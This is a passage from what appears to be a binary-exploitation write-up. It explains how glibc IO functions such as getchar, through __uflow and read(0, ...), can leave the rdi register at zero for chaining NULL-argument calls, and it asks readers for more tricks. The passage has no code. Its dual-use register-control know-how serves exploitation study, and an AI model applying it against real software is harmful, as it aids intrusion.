Since this is a macro, the `fp` wouldn't be loaded into `rdi`, so the only chance you really have is if `__uflow` for example did something useful. In `getchar`, if `stdin` is unbuffered (or buffer is empty), it will call `read(0, ...)`, which leaves `rdi=0`, and maybe you can then use the `rdi=NULL` case functions.

These are just a few functions which can help, there could be many more that I'm not aware of. Most of these are just some common ones which have one thing in common: they're IO functions.

If anyone has any other tricks for this, I'd be interested to know, and maybe I'll update this to include them, with credit of course :)
